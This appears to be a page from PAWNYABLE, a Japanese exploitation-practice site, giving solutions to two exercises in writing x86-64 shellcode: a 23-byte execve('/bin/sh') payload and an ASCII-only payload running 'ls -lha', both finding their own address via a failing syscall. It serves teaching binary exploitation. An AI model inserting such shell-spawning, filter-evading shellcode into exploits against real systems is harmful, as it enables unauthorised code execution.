@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+
+
+
+
+
+<title>例題の解答 - シェルコードの書き方 | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline-flex;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+            
+                例題の解答 - シェルコードの書き方
+            
+            
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+</div>
+
+    <div class="post-content">
+    <h2><span id="例題1">例題１</span></h2>
+<p>【問題】<br>
+すべての汎用レジスタが0xdeadbeefcafebabeの状態から<code>/bin/sh</code>を起動するシェルコードを24バイト以内で書け。（汎用レジスタはRSPやRBPも含む。）</p>
+<p>【解答】<br>
+シェルを起動するためには</p>
+<ul>
+<li>rdxを0にする</li>
+<li>rsiを0にする</li>
+<li>rdiに&quot;/bin/sh&quot;の文字列ポインタを入れる</li>
+<li>raxを59にする</li>
+<li><code>syscall</code>命令を呼ぶ</li>
+</ul>
+<p>という処理が必要です。まずraxを59にすることを考えます。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax, 59</span><br></pre></td></tr></table></figure>
+<p>では5バイト消費してしまうので、alに対する操作にします。そのためeaxを0にしてからalに59を書き込みます。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor eax, eax</span><br><span class="line">mov al, 59</span><br></pre></td></tr></table></figure>
+<p>これで4バイトになりました。<br>
+xorにより最初にeaxが0になるので、これを利用して<code>cdq</code>命令でrdxレジスタを0にしましょう。rsiについてはxorかmovで0にして、<code>syscall</code>命令を呼びます。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xor eax, eax</span><br><span class="line">cdq</span><br><span class="line">mov esi, eax</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>ここまで9バイトで条件を4つクリアしました。<br>
+残る条件はrdiに&quot;/bin/sh&quot;のアドレスを入れることです。<code>call</code>命令を使うと短く済むのですが、今回スタックポインタが不正なアドレスを指しているので<code>call</code>や<code>pop</code>は使えません。<br>
+すると<code>lea</code>命令を使うことを考えますが</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea rdi, [rel s_binsh]</span><br></pre></td></tr></table></figure>
+<p>は8バイトも使ってしまいます。“/bin/sh\0&quot;に8バイト必要なので、ここまでを合わせると8+8+9=25となり、24バイトでは実現できません。そこで、別の方法を使ってシェルコード領域のポインタを取得します。<br>
+今回raxレジスタの初期状態は0xdeadbeefcafebabeなので、この状態でシステムコールを呼ぶと必ず失敗します。この際rcxレジスタに戻りアドレスが入るので、ここからシェルコード領域のアドレスを取得できます。シェルコードのアドレスが分かれば、rcxに値を足して”/bin/sh&quot;へのポインタを作れば完成です。<br>
+以下のシェルコードは23バイトです。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syscall</span><br><span class="line">xor eax, eax</span><br><span class="line">cdq</span><br><span class="line">mov esi, eax</span><br><span class="line">lea rdi, [rcx+13]</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br><span class="line">db &quot;/bin/sh&quot;,0</span><br></pre></td></tr></table></figure>
+<p>このシェルコードは<a href="src/smalsh.S">ここ</a>からダウンロードできます。<br>
+同じ条件でもっと短いシェルコードを書けたよ〜という方はご一報ください。</p>
+<h2><span id="例題2">例題２</span></h2>
+<p>【問題】<br>
+0x00から0x7Fまでのバイト列のみを使って「ls -lha」を実行するシェルコードを書け。ただし、シェルコード領域は書き込み不能とする。また、RSPは正常なスタックポインタを指しているが、それ以外のレジスタやスタック上のデータの初期状態はランダムと仮定する。</p>
+<p>【解答】<br>
+まずコマンドを実行するためには次の処理をする必要があります。</p>
+<ul>
+<li>rdxを0にする</li>
+<li>rsiを引数配列のポインタにする</li>
+<li>rdiを文字列ポインタにする</li>
+<li>raxを59にする</li>
+<li><code>syscall</code>命令を呼ぶ</li>
+</ul>
+<p>レジスタの初期状態がランダムなので、まずはレジスタを0にすることを考えます。これは説明した通り、次の命令で実現できます。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push rax</span><br><span class="line">xor rax, [rsp]</span><br></pre></td></tr></table></figure>
+<p>したがって、rdxを0にするのは実現可能です。次にraxを59にする方法ですが、add命令が使えます。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add al, 59</span><br></pre></td></tr></table></figure>
+<p>これでシステムコール番号も用意できました。<code>syscall</code>命令はASCIIの範囲内なのでそのまま使えます。</p>
+<p>さて、文字列ポインタを取得する方法ですが、<code>call</code>命令や<code>lea</code>命令を使うとASCIIの範囲を超えるため、例題１と同じく<code>syscall</code>命令を使ってシェルコードのアドレスを取得します。今回レジスタの初期状態は未定義ですので、システムコールが必ず失敗する（あるいは意味の無い動作をする）状況を作ってから<code>syscall</code>命令を呼び出しましょう。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; rax=0</span><br><span class="line">push rax</span><br><span class="line">xor rax, [rsp]</span><br><span class="line">; rsi=0</span><br><span class="line">push rax</span><br><span class="line">pop rsi</span><br><span class="line">; rcx=shellcode+delta</span><br><span class="line">syscall</span><br><span class="line">; &lt;-- retaddr</span><br></pre></td></tr></table></figure>
+<p>シェルコードのアドレスが得られたので、シェルコード上に用意した各種文字列へのポインタが計算できます。次のようにしてraxにデータへのポインタが入ります。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push rcx</span><br><span class="line">pop rax</span><br><span class="line">add al, arg1 - retaddr</span><br></pre></td></tr></table></figure>
+<p>なお、今回alレジスタに固定値を加算しているため2つの問題が発生します。<br>
+1つはオフセット<code>arg1 - retaddr</code>がASCIIで表せないオフセットになる可能性です。今回作るシェルコードは十分に小さいのでこれは起こりません。もしオフセットが大きくなったとしても、ゴミデータでオフセットをずらして2バイトの値にし、axレジスタに加算すれば問題は回避できます。<br>
+次にalへの加算でオーバーフローが発生した場合に64-bitとして見たときの計算結果がずれる可能性です。こちらはシェルコードがロードされるアドレスによって十分に起こり得ます。その場合、初めに<code>syscall</code>命令を呼ぶ前に<code>push rax; pop rax;</code>のようなゴミ命令を入れてオフセットをずらせば解決できます。</p>
+<p>さて、ここまでの説明でシェルコードは作れます。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">; rax=0</span><br><span class="line">push rax</span><br><span class="line">xor rax, [rsp]</span><br><span class="line">; rsi=0</span><br><span class="line">push rax</span><br><span class="line">pop rsi</span><br><span class="line">; rcx=shellcode+delta</span><br><span class="line">syscall</span><br><span class="line">@retaddr:</span><br><span class="line">; rdx=0; push 0</span><br><span class="line">push rdx</span><br><span class="line">xor rdx, [rsp]</span><br><span class="line">push rdx</span><br><span class="line">; push arg2</span><br><span class="line">push rcx</span><br><span class="line">pop rax</span><br><span class="line">add al, @arg2 - @retaddr</span><br><span class="line">push rax</span><br><span class="line">; push arg1</span><br><span class="line">push rcx</span><br><span class="line">pop rax</span><br><span class="line">add al, @arg1 - @retaddr</span><br><span class="line">push rax</span><br><span class="line">; push arg0</span><br><span class="line">push rcx</span><br><span class="line">pop rax</span><br><span class="line">add al, @arg0 - @retaddr</span><br><span class="line">push rax</span><br><span class="line">; rdi=arg0</span><br><span class="line">push rax</span><br><span class="line">pop rdi</span><br><span class="line">; rsi=rsp</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">; rax=59</span><br><span class="line">push rdx</span><br><span class="line">pop rax</span><br><span class="line">add al, 59</span><br><span class="line">; syscall</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">@arg0:</span><br><span class="line">db &quot;/bin/sh&quot;, 0</span><br><span class="line">@arg1:</span><br><span class="line">db &quot;-c&quot;, 0</span><br><span class="line">@arg2:</span><br><span class="line">db &quot;/bin/ls -lha&quot;, 0</span><br></pre></td></tr></table></figure>
+<p>このシェルコードは<a href="src/asciils.S">ここ</a>からダウンロードできます。</p>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2022 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
